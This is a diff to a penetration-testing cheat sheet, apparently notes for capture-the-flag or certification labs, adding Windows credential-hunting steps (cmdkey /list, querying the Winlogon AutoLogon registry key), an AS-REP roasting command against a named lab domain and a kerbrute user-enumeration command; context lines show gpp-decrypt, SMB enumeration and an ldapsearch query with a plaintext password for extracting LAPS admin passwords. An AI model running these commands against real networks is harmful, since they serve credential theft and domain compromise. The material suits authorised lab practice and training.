@@ -1,4 +1,6 @@
 # FEEL LIKE STUCK???
+- Did we run cmdkey /list?
+- Did we check AutoLogon registery?? reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"?
 - Did we try ftp login with admin:admin, ftp:ftp etc?
 - Did we check Groups.xml?(crack with gpp-decrypt)
 - Did we try crackmapexec, enum4linux, smbclient, smbmap, rpcclient, ldapsearch anonymously/guestuser?
@@ -128,6 +130,12 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 # Putty
 > reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 
+# AutoLogon
+> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# cmdkey /list
+>
+
 
 # Search for Modifiable services/executables with PowerUP.ps1
 > . .\PowerUp.ps1
@@ -241,6 +249,8 @@ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 
 ## AS-REP Roasting
 ```bash
+GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
+
 impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
 .\Rubeus.exe asreproast /nowrap
 
@@ -479,6 +489,10 @@ ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offse
 ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 
+# kerbrute
+```bash
+kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
+```
 
 # SNMP(161)
 ```bash
